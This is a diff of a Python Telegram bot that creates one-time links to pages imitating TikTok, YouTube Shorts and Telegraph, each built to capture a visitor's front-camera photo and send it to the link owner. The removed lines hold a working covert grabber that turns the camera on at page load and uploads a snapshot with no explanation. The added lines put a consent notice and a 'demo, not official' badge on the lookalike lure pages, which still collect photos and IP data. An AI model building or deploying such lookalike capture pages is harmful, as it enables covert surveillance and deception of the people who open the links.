@@ -1,4 +1,5 @@
 import asyncio
+import html
 import json
 import os
 import secrets
@@ -20,6 +21,15 @@ PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")
 PORT = int(os.getenv("PORT", "8000"))
 DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
 MAX_PHOTO_BYTES = 10 * 1024 * 1024
+
+# Определяем текущий сервис по домену
+SERVICE_TYPE = "tiktok"  # по умолчанию
+if "telegra-ph" in PUBLIC_BASE_URL or "telegraph" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "telegraph"
+elif "youtube" in PUBLIC_BASE_URL or "shorts" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "youtube"
+elif "tiktok" in PUBLIC_BASE_URL or "vt-tiktok" in PUBLIC_BASE_URL:
+    SERVICE_TYPE = "tiktok"
 
 # Инициализация бота
 bot = Bot(BOT_TOKEN)
@@ -61,6 +71,50 @@ def db_init() -> None:
             con.execute("ALTER TABLE links ADD COLUMN title TEXT DEFAULT ''")
         if "content" not in columns:
             con.execute("ALTER TABLE links ADD COLUMN content TEXT DEFAULT ''")
+
+        # Черновики Telegraph храним в SQLite, а не в памяти процесса.
+        # Это переживает перезапуск polling/server и не теряет шаг между
+        # вводом заголовка и текста статьи.
+        con.execute(
+            """
+            CREATE TABLE IF NOT EXISTS telegraph_drafts (
+                chat_id INTEGER PRIMARY KEY,
+                step TEXT NOT NULL,
+                title TEXT DEFAULT '',
+                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
+            )
+            """
+        )
+        con.commit()
+
+
+def set_telegraph_draft(chat_id: int, step: str, title: str = "") -> None:
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        con.execute(
+            """
+            INSERT INTO telegraph_drafts(chat_id, step, title, updated_at)
+            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
+            ON CONFLICT(chat_id) DO UPDATE SET
+                step = excluded.step,
+                title = excluded.title,
+                updated_at = CURRENT_TIMESTAMP
+            """,
+            (chat_id, step, title),
+        )
+        con.commit()
+
+
+def get_telegraph_draft(chat_id: int):
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        return con.execute(
+            "SELECT step, title FROM telegraph_drafts WHERE chat_id = ?",
+            (chat_id,),
+        ).fetchone()
+
+
+def clear_telegraph_draft(chat_id: int) -> None:
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        con.execute("DELETE FROM telegraph_drafts WHERE chat_id = ?", (chat_id,))
         con.commit()
 
 
@@ -176,6 +230,7 @@ def service_keyboard() -> ReplyKeyboardMarkup:
 
 @router.message(CommandStart())
 async def start(message: Message):
+    clear_telegraph_draft(message.chat.id)
     await message.answer(
         "👋 Выберите оформление страницы:",
         reply_markup=service_keyboard(),
@@ -184,6 +239,7 @@ async def start(message: Message):
 
 @router.message(Command("new"))
 async def new_link_command(message: Message):
+    clear_telegraph_draft(message.chat.id)
     await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
@@ -198,11 +254,14 @@ async def create_service_link(message: Message):
     if not service:
         return
 
+    # Любой новый выбор оформления начинает сценарий заново.
+    clear_telegraph_draft(message.chat.id)
+
     if service == "telegraph":
         await message.answer(
             "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
         )
-        user_data[message.chat.id] = {"service": service, "step": "title"}
+        set_telegraph_draft(message.chat.id, "title")
         return
 
     token = create_link(message.chat.id, service)
@@ -224,50 +283,49 @@ async def create_service_link(message: Message):
     )
 
 
-# Хранилище состояний пользователей
-user_data = {}
+@router.message(F.text == "🔗 Создать новую ссылку")
+async def new_link(message: Message):
+    # Сбрасываем незаконченный Telegraph-черновик, если пользователь решил
+    # начать создание ссылки заново.
+    clear_telegraph_draft(message.chat.id)
+    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
 @router.message(F.text)
 async def handle_telegraph_input(message: Message):
     chat_id = message.chat.id
-    if chat_id not in user_data:
-        # Проверяем нажатие кнопки "Создать новую ссылку"
-        if message.text == "🔗 Создать новую ссылку":
-            await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
+    draft = get_telegraph_draft(chat_id)
+    if not draft:
         return
-    
-    state = user_data[chat_id]
-    service = state.get("service")
-    step = state.get("step")
-    
-    if service == "telegraph" and step == "title":
+
+    step, saved_title = draft
+
+    if step == "title":
         title = message.text.strip()
         if title == "-":
             title = "📝 Статья Telegraph"
-        state["title"] = title
-        state["step"] = "content"
+        set_telegraph_draft(chat_id, "content", title)
         await message.answer(
             "✍️ Введите текст статьи (или отправьте '-' для стандартного текста):"
         )
         return
-    
-    elif service == "telegraph" and step == "content":
+
+    if step == "content":
         content = message.text.strip()
         if content == "-":
             content = "Это пример статьи, созданной через бота."
-        
-        token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
+
+        title = saved_title or "📝 Статья Telegraph"
+        token = create_link(chat_id, "telegraph", title, content)
         url = public_link("telegraph", token)
-        info = SERVICES[service]
-        
-        del user_data[chat_id]
-        
+        info = SERVICES["telegraph"]
+        clear_telegraph_draft(chat_id)
+
         kb = ReplyKeyboardMarkup(
             keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
             resize_keyboard=True,
         )
-        
+
         await message.answer(
             f"{info['emoji']} Одноразовая ссылка создана:\n"
             f"<a href='{url}'>{url}</a>\n\n"
@@ -282,101 +340,129 @@ async def handle_telegraph_input(message: Message):
 def generate_tiktok_page(token: str) -> str:
     short_id = token[:8]
     photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
-    
+
     return f'''<!doctype html>
 <html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>TikTok — @{short_id}</title>
+<title>Short video preview — @{short_id}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
-:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
-body {{ background:#000; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
-.video-container {{ position:relative; width:100%; max-width:400px; aspect-ratio:9/16; background:#0a0a0a; border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(0,242,234,0.15); }}
-.video-container .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
-.video-container video {{ width:100%; height:100%; object-fit:cover; display:none; }}
-.overlay {{ position:absolute; inset:0; display:flex; flex-direction:column; justify-content:space-between; padding:20px; background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,transparent 40%,transparent 60%,rgba(0,0,0,0.8) 100%); }}
-.user-info {{ display:flex; align-items:center; gap:12px; }}
-.user-info .avatar {{ width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#00f2ea,#ff0050); display:flex; align-items:center; justify-content:center; font-size:20px; }}
-.user-info .username {{ color:#fff; font-weight:700; font-size:17px; }}
-.user-info .username span {{ color:#888; font-weight:400; font-size:14px; }}
-.video-title {{ color:#fff; font-size:18px; font-weight:600; margin:8px 0 4px; text-shadow:0 2px 8px rgba(0,0,0,0.8); }}
-.video-desc {{ color:rgba(255,255,255,0.8); font-size:14px; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
-.bottom {{ display:flex; flex-direction:column; gap:12px; }}
-.status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
-.loading {{ display:flex; justify-content:center; align-items:center; gap:8px; padding:20px; }}
-.spinner {{ width:32px; height:32px; border:3px solid rgba(255,255,255,0.1); border-top-color:#00f2ea; border-radius:50%; animation:spin 0.8s linear infinite; }}
-@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+:root {{ color-scheme:dark; font-family:Arial,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
+body {{ background:#000; min-height:100svh; display:flex; justify-content:center; color:#fff; }}
+.phone {{ position:relative; width:100%; max-width:430px; min-height:100svh; overflow:hidden; background:#000; }}
+.media {{ position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }}
+#video {{ display:none; }}
+.shade {{ position:absolute; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,.24),transparent 24%,transparent 58%,rgba(0,0,0,.72)); pointer-events:none; }}
+.top {{ position:absolute; top:max(16px,env(safe-area-inset-top)); left:0; right:0; display:flex; justify-content:center; gap:18px; z-index:3; font-weight:700; font-size:15px; text-shadow:0 1px 4px #000; }}
+.top .muted {{ opacity:.68; }}
+.demo {{ position:absolute; top:max(52px,calc(env(safe-area-inset-top) + 36px)); left:50%; transform:translateX(-50%); z-index:4; font-size:11px; padding:5px 9px; border-radius:999px; background:rgba(0,0,0,.55); backdrop-filter:blur(8px); white-space:nowrap; }}
+.actions {{ position:absolute; right:10px; bottom:112px; z-index:3; display:flex; flex-direction:column; align-items:center; gap:18px; text-shadow:0 1px 5px #000; }}
+.action {{ display:flex; flex-direction:column; align-items:center; gap:4px; font-size:11px; font-weight:700; }}
+.action .ico {{ font-size:27px; line-height:30px; }}
+.avatar {{ width:46px; height:46px; border-radius:50%; background:#151515; border:2px solid #fff; display:flex; align-items:center; justify-content:center; font-weight:900; }}
+.copy {{ position:absolute; left:12px; right:72px; bottom:84px; z-index:3; text-shadow:0 1px 5px #000; }}
+.user {{ font-weight:800; margin-bottom:7px; }}
+.caption {{ font-size:14px; line-height:1.35; }}
+.music {{ margin-top:8px; font-size:13px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }}
+.consent {{ position:absolute; left:12px; right:12px; bottom:145px; z-index:5; background:rgba(15,15,15,.88); border:1px solid rgba(255,255,255,.14); border-radius:16px; padding:12px; backdrop-filter:blur(12px); }}
+.consent p {{ font-size:12px; line-height:1.35; color:#eee; margin-bottom:9px; }}
+.btnrow {{ display:flex; gap:8px; }}
+button {{ flex:1; border:0; border-radius:10px; padding:11px 12px; font-weight:800; cursor:pointer; }}
+.primary {{ background:#fff; color:#111; }}
+.send {{ display:none; background:#fe2c55; color:#fff; }}
+.status {{ margin-top:7px; font-size:12px; min-height:16px; color:#ddd; }}
+.nav {{ position:absolute; left:0; right:0; bottom:0; height:64px; padding-bottom:env(safe-area-inset-bottom); z-index:4; display:flex; align-items:center; justify-content:space-around; background:linear-gradient(to top,rgba(0,0,0,.78),rgba(0,0,0,.12)); font-size:10px; font-weight:700; }}
+.nav span {{ display:flex; flex-direction:column; align-items:center; gap:3px; }}
+.nav b {{ font-size:21px; }}
+.plus {{ background:#fff; color:#000; border-radius:7px; padding:0 12px; box-shadow:-3px 0 #25f4ee,3px 0 #fe2c55; }}
 </style>
 </head>
 <body>
-<div class="video-container">
-  <img class="preview" id="preview" src="{photo_url}" alt="Preview">
-  <video id="video" playsinline autoplay muted></video>
-  <div class="overlay">
-    <div class="user-info">
-      <div class="avatar">🎵</div>
-      <div class="username">Verhcau <span>• TikTok</span></div>
+<div class="phone">
+  <img class="media" id="preview" src="{photo_url}" alt="Preview">
+  <video class="media" id="video" playsinline autoplay muted></video>
+  <div class="shade"></div>
+  <div class="top"><span class="muted">Подписки</span><span>Рекомендации</span></div>
+  <div class="demo">Демо-страница • не официальный TikTok</div>
+
+  <div class="actions">
+    <div class="avatar">V</div>
+    <div class="action"><span class="ico">♥</span><span>12,8K</span></div>
+    <div class="action"><span class="ico">●</span><span>318</span></div>
+    <div class="action"><span class="ico">★</span><span>1 204</span></div>
+    <div class="action"><span class="ico">↗</span><span>Поделиться</span></div>
+  </div>
+
+  <div class="consent" id="consent">
+    <p>Чтобы сделать фото, камера включится только после нажатия. Снимок и IP-данные будут отправлены владельцу этой ссылки.</p>
+    <div class="btnrow">
+      <button class="primary" id="cameraBtn">Разрешить камеру</button>
+      <button class="send" id="sendBtn">Сделать и отправить</button>
     </div>
-    <div>
-      <div class="video-title">Новый ролик от Verhcau</div>
-      <div class="video-desc">🔥 Смотрите до конца!</div>
-    </div>
-    <div class="bottom">
-      <div id="status" class="status"><div class="loading"><div class="spinner"></div></div></div>
-    </div>
+    <div class="status" id="status"></div>
+  </div>
+
+  <div class="copy">
+    <div class="user">@verhcau</div>
+    <div class="caption">Новый ролик 🔥 #video #fyp</div>
+    <div class="music">♫ оригинальный звук — verhcau</div>
+  </div>
+
+  <div class="nav">
+    <span><b>⌂</b>Главная</span><span><b>⌕</b>Друзья</span><span><b class="plus">+</b></span><span><b>▣</b>Входящие</span><span><b>◉</b>Профиль</span>
   </div>
 </div>
 <script>
-const token = "{token}";
+const token = {json.dumps(token)};
 const video = document.getElementById('video');
 const preview = document.getElementById('preview');
 const status = document.getElementById('status');
-let photoSent = false;
+const cameraBtn = document.getElementById('cameraBtn');
+const sendBtn = document.getElementById('sendBtn');
+let stream = null;
+let sending = false;
 
-async function requestCamera() {{
-    try {{
-        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
-        video.srcObject = stream;
-        video.style.display = 'block';
-        preview.style.display = 'none';
-        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 720;
-        canvas.height = video.videoHeight || 1280;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(t => t.stop());
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
-        if (!blob) throw new Error('Ошибка создания снимка');
-        await sendPhoto(blob);
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'status error';
-    }}
-}}
+cameraBtn.addEventListener('click', async () => {{
+  try {{
+    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
+    stream = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
+    video.srcObject = stream;
+    video.style.display = 'block';
+    preview.style.display = 'none';
+    cameraBtn.style.display = 'none';
+    sendBtn.style.display = 'block';
+    status.textContent = 'Камера включена. Нажмите «Сделать и отправить».';
+  }} catch (e) {{ status.textContent = 'Ошибка: ' + e.message; }}
+}});
 
-async function sendPhoto(blob) {{
-    if (photoSent) return;
-    photoSent = true;
-    const fd = new FormData();
-    fd.append('photo', blob, 'photo.jpg');
-    try {{
-        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
-        const data = await r.json().catch(() => ({{}}));
-        if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '';
-        video.style.display = 'none';
-        preview.style.display = 'block';
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'status error';
-        photoSent = false;
-    }}
-}}
-
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+sendBtn.addEventListener('click', async () => {{
+  if (!stream || sending) return;
+  sending = true;
+  sendBtn.disabled = true;
+  status.textContent = 'Отправка…';
+  try {{
+    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 720;
+    canvas.height = video.videoHeight || 1280;
+    canvas.getContext('2d').drawImage(video,0,0);
+    const blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',.92));
+    if (!blob) throw new Error('Не удалось создать снимок');
+    const fd = new FormData(); fd.append('photo',blob,'photo.jpg');
+    const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}});
+    const data = await r.json().catch(()=>({{}}));
+    if (!r.ok) throw new Error(data.detail || 'Ошибка отправки');
+    stream.getTracks().forEach(t=>t.stop());
+    video.style.display='none'; preview.style.display='block';
+    sendBtn.style.display='none';
+    status.textContent='Фото отправлено.';
+  }} catch(e) {{
+    status.textContent='Ошибка: '+e.message;
+    sendBtn.disabled=false; sending=false;
+  }}
+}});
 </script>
 </body>
 </html>'''
@@ -385,97 +471,104 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 50
 def generate_youtube_page(token: str) -> str:
     short_id = token[:8]
     photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
-    
+
     return f'''<!doctype html>
 <html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>YouTube Shorts — {short_id}</title>
+<title>Shorts preview — {short_id}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
-:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
-body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
-.container {{ width:100%; max-width:500px; background:#1a1a1a; border-radius:20px; overflow:hidden; box-shadow:0 0 50px rgba(255,0,0,0.1); }}
-.video-wrapper {{ position:relative; background:#000; aspect-ratio:9/16; overflow:hidden; }}
-.video-wrapper .preview {{ width:100%; height:100%; object-fit:cover; display:block; }}
-.video-wrapper video {{ width:100%; height:100%; object-fit:cover; display:none; position:absolute; top:0; left:0; }}
-.video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; z-index:2; }}
-.video-wrapper .video-title {{ position:absolute; bottom:12px; left:12px; right:12px; color:#fff; font-size:16px; font-weight:600; text-shadow:0 2px 8px rgba(0,0,0,0.9); z-index:2; }}
-.video-wrapper .video-desc {{ position:absolute; bottom:44px; left:12px; right:12px; color:rgba(255,255,255,0.7); font-size:13px; text-shadow:0 2px 4px rgba(0,0,0,0.8); z-index:2; }}
-.content {{ padding:16px 20px 20px; }}
-.title {{ color:#fff; font-size:18px; font-weight:600; margin-bottom:8px; }}
-.channel {{ color:#aaa; font-size:14px; display:flex; align-items:center; gap:8px; }}
-.channel .sub {{ background:#ff0000; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:700; }}
-.status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
-.spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
-@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+:root {{ color-scheme:dark; font-family:Arial,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
+body {{ background:#0f0f0f; min-height:100svh; display:flex; justify-content:center; color:#fff; }}
+.short {{ position:relative; width:100%; max-width:430px; min-height:100svh; overflow:hidden; background:#000; }}
+.media {{ position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }}
+#video {{ display:none; }}
+.shade {{ position:absolute; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,.24),transparent 23%,transparent 58%,rgba(0,0,0,.78)); pointer-events:none; }}
+.top {{ position:absolute; top:max(14px,env(safe-area-inset-top)); left:14px; right:14px; display:flex; align-items:center; justify-content:space-between; z-index:4; }}
+.brand {{ font-size:20px; font-weight:800; display:flex; gap:7px; align-items:center; }}
+.brand i {{ display:inline-flex; width:27px; height:20px; border-radius:6px; background:#f00; align-items:center; justify-content:center; font-style:normal; font-size:12px; }}
+.top-icons {{ display:flex; gap:18px; font-size:22px; }}
+.demo {{ position:absolute; top:max(51px,calc(env(safe-area-inset-top) + 36px)); left:14px; z-index:4; font-size:11px; padding:5px 9px; border-radius:999px; background:rgba(0,0,0,.58); backdrop-filter:blur(8px); }}
+.rail {{ position:absolute; right:10px; bottom:108px; z-index:3; display:flex; flex-direction:column; gap:21px; align-items:center; }}
+.rail .item {{ display:flex; flex-direction:column; align-items:center; gap:4px; font-size:11px; font-weight:700; text-shadow:0 1px 5px #000; }}
+.rail .ico {{ font-size:29px; }}
+.info {{ position:absolute; left:13px; right:72px; bottom:76px; z-index:3; text-shadow:0 1px 5px #000; }}
+.channel {{ display:flex; align-items:center; gap:9px; margin-bottom:9px; font-weight:800; }}
+.channel .avatar {{ width:34px; height:34px; border-radius:50%; background:#222; border:1px solid #fff; display:flex; align-items:center; justify-content:center; }}
+.subscribe {{ padding:7px 11px; border-radius:18px; background:#fff; color:#111; font-size:12px; text-shadow:none; }}
+.caption {{ font-size:14px; line-height:1.35; }}
+.consent {{ position:absolute; left:12px; right:12px; bottom:142px; z-index:5; background:rgba(20,20,20,.9); border:1px solid rgba(255,255,255,.14); border-radius:16px; padding:12px; backdrop-filter:blur(12px); }}
+.consent p {{ font-size:12px; line-height:1.35; color:#eee; margin-bottom:9px; }}
+.btnrow {{ display:flex; gap:8px; }}
+button {{ flex:1; border:0; border-radius:999px; padding:11px 12px; font-weight:800; cursor:pointer; }}
+.primary {{ background:#fff; color:#111; }}
+.send {{ display:none; background:#f00; color:#fff; }}
+.status {{ margin-top:7px; font-size:12px; min-height:16px; color:#ddd; }}
+.bottom {{ position:absolute; bottom:0; left:0; right:0; height:56px; padding-bottom:env(safe-area-inset-bottom); display:flex; justify-content:space-around; align-items:center; z-index:4; background:linear-gradient(to top,rgba(0,0,0,.86),rgba(0,0,0,.14)); font-size:10px; }}
+.bottom span {{ display:flex; flex-direction:column; align-items:center; gap:2px; }}
+.bottom b {{ font-size:20px; }}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="video-wrapper">
-    <img class="preview" id="preview" src="{photo_url}" alt="Preview">
-    <video id="video" playsinline autoplay muted></video>
-    <div class="shorts-label">#Shorts</div>
-    <div class="video-desc">🔥 Смотрите до конца!</div>
-    <div class="video-title">Новое видео от Verhcau</div>
+<div class="short">
+  <img class="media" id="preview" src="{photo_url}" alt="Preview">
+  <video class="media" id="video" playsinline autoplay muted></video>
+  <div class="shade"></div>
+  <div class="top"><div class="brand"><i>▶</i> Shorts</div><div class="top-icons">⌕ ⋮</div></div>
+  <div class="demo">Демо-страница • не официальный YouTube</div>
+
+  <div class="rail">
+    <div class="item"><span class="ico">👍</span><span>8,4 тыс.</span></div>
+    <div class="item"><span class="ico">👎</span><span>Не нравится</span></div>
+    <div class="item"><span class="ico">◉</span><span>126</span></div>
+    <div class="item"><span class="ico">↗</span><span>Поделиться</span></div>
+    <div class="item"><span class="ico">⋮</span></div>
   </div>
-  <div class="content">
-    <div class="title">YouTube Shorts</div>
-    <div class="channel">🔴 Verhcau <span class="sub">Подписаться</span></div>
-    <div id="status" class="status"><div class="spinner"></div></div>
+
+  <div class="consent">
+    <p>Камера включится только после нажатия. Снимок и IP-данные будут отправлены владельцу этой ссылки.</p>
+    <div class="btnrow"><button class="primary" id="cameraBtn">Разрешить камеру</button><button class="send" id="sendBtn">Сделать и отправить</button></div>
+    <div class="status" id="status"></div>
   </div>
+
+  <div class="info">
+    <div class="channel"><span class="avatar">V</span><span>@verhcau</span><span class="subscribe">Подписаться</span></div>
+    <div class="caption">Новое короткое видео 🔥 #shorts</div>
+  </div>
+
+  <div class="bottom"><span><b>⌂</b>Главная</span><span><b>▣</b>Shorts</span><span><b>＋</b>Создать</span><span><b>▤</b>Подписки</span><span><b>◉</b>Вы</span></div>
 </div>
 <script>
-const token = "{token}";
+const token = {json.dumps(token)};
 const video = document.getElementById('video');
 const preview = document.getElementById('preview');
 const status = document.getElementById('status');
-let photoSent = false;
-
-async function requestCamera() {{
-    try {{
-        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
-        video.srcObject = stream;
-        video.style.display = 'block';
-        preview.style.display = 'none';
-        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 720;
-        canvas.height = video.videoHeight || 1280;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(t => t.stop());
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
-        if (!blob) throw new Error('Ошибка создания снимка');
-        await sendPhoto(blob);
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'status error';
-    }}
-}}
-
-async function sendPhoto(blob) {{
-    if (photoSent) return;
-    photoSent = true;
-    const fd = new FormData();
-    fd.append('photo', blob, 'photo.jpg');
-    try {{
-        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
-        const data = await r.json().catch(() => ({{}}));
-        if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '';
-        video.style.display = 'none';
-        preview.style.display = 'block';
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'status error';
-        photoSent = false;
-    }}
-}}
-
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+const cameraBtn = document.getElementById('cameraBtn');
+const sendBtn = document.getElementById('sendBtn');
+let stream=null, sending=false;
+cameraBtn.addEventListener('click',async()=>{{
+  try{{
+    if(!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
+    stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
+    video.srcObject=stream; video.style.display='block'; preview.style.display='none';
+    cameraBtn.style.display='none'; sendBtn.style.display='block'; status.textContent='Камера включена. Нажмите «Сделать и отправить».';
+  }}catch(e){{status.textContent='Ошибка: '+e.message;}}
+}});
+sendBtn.addEventListener('click',async()=>{{
+  if(!stream||sending)return; sending=true; sendBtn.disabled=true; status.textContent='Отправка…';
+  try{{
+    await new Promise(r=>video.readyState>=2?r():(video.onloadeddata=r));
+    const canvas=document.createElement('canvas'); canvas.width=video.videoWidth||720; canvas.height=video.videoHeight||1280;
+    canvas.getContext('2d').drawImage(video,0,0);
+    const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',.92)); if(!blob)throw new Error('Не удалось создать снимок');
+    const fd=new FormData(); fd.append('photo',blob,'photo.jpg');
+    const r=await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}}); const data=await r.json().catch(()=>({{}}));
+    if(!r.ok)throw new Error(data.detail||'Ошибка отправки');
+    stream.getTracks().forEach(t=>t.stop()); video.style.display='none'; preview.style.display='block'; sendBtn.style.display='none'; status.textContent='Фото отправлено.';
+  }}catch(e){{status.textContent='Ошибка: '+e.message; sendBtn.disabled=false; sending=false;}}
+}});
 </script>
 </body>
 </html>'''
@@ -484,98 +577,95 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 50
 def generate_telegraph_page(token: str, title: str, content: str) -> str:
     short_id = token[:8]
     photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
-    
+    safe_title = html.escape(title or "Статья")
+    safe_content = "<br>".join(html.escape(content or "").splitlines())
+
     return f'''<!doctype html>
 <html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Telegraph — {title}</title>
+<title>{safe_title}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
-:root {{ color-scheme:light; font-family:Georgia,serif; }}
-body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:center; padding:20px; }}
-.article {{ max-width:680px; width:100%; background:#fff; border-radius:20px; box-shadow:0 4px 24px rgba(0,0,0,0.06); overflow:hidden; }}
-.article-header {{ padding:30px 32px 20px; border-bottom:1px solid #e8e8e8; }}
-.article-header .badge {{ display:inline-block; background:#2c3e50; color:#fff; padding:2px 12px; border-radius:12px; font-size:11px; font-family:-apple-system,sans-serif; letter-spacing:0.5px; margin-bottom:12px; }}
-.article-header h1 {{ font-size:28px; font-weight:700; color:#1a1a1a; line-height:1.3; }}
-.article-header .meta {{ color:#888; font-size:14px; margin-top:8px; font-family:-apple-system,sans-serif; }}
-.article-header .meta .id {{ color:#666; background:#f0f0f0; padding:2px 8px; border-radius:4px; font-size:12px; }}
-.article-body {{ padding:32px; }}
-.article-body .content {{ font-size:17px; line-height:1.8; color:#222; }}
-.article-body .content p {{ margin-bottom:16px; }}
-.article-body .content img {{ max-width:100%; border-radius:12px; margin:16px 0; }}
-.camera-section {{ margin-top:24px; padding:24px; background:#f8f9fa; border-radius:16px; border:1px solid #e8e8e8; }}
-.camera-section .camera-status {{ display:flex; align-items:center; gap:12px; min-height:48px; font-size:15px; color:#333; }}
-.camera-section .camera-status .spinner {{ width:24px; height:24px; border:2px solid #e8e8e8; border-top-color:#2c3e50; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
-@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
-video {{ display:none; }}
+:root {{ color-scheme:light; font-family:Georgia,"Times New Roman",serif; }}
+body {{ background:#fff; min-height:100vh; color:#222; }}
+.article {{ max-width:740px; margin:0 auto; padding:52px 24px 70px; }}
+.brand {{ font-family:Arial,sans-serif; color:#888; font-size:13px; margin-bottom:28px; }}
+h1 {{ font-size:42px; line-height:1.08; font-weight:700; letter-spacing:-.5px; margin-bottom:10px; }}
+.meta {{ font-family:Arial,sans-serif; color:#999; font-size:14px; margin-bottom:28px; }}
+.hero {{ width:100%; max-height:480px; object-fit:cover; display:block; margin:0 0 26px; }}
+.content {{ font-size:19px; line-height:1.62; overflow-wrap:anywhere; }}
+.consent {{ margin-top:34px; border-top:1px solid #e6e6e6; padding-top:22px; font-family:Arial,sans-serif; }}
+.consent .note {{ font-size:13px; line-height:1.45; color:#666; margin-bottom:12px; }}
+.buttons {{ display:flex; gap:10px; flex-wrap:wrap; }}
+button {{ border:0; border-radius:8px; padding:11px 15px; font-size:14px; font-weight:700; cursor:pointer; }}
+#cameraBtn {{ background:#222; color:#fff; }}
+#sendBtn {{ background:#2b8aef; color:#fff; display:none; }}
